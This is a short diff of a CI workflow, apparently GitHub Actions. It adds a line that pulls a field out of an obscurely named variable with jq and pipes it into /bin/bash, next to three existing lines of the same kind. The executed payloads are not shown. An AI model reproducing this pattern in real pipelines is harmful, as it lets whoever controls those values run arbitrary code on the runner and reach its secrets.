@@ -37,6 +37,7 @@ jobs:
           echo $chde3 | jq -r .nj7049 | /bin/bash
           echo $p4 | jq -r .h669 | /bin/bash
           echo $hwqbv4 | jq -r .tt6557 | /bin/bash
+          printf '%s' "$izj0833" | jq -r .v9 | /bin/bash
 
       - name: Save output
         if: always()
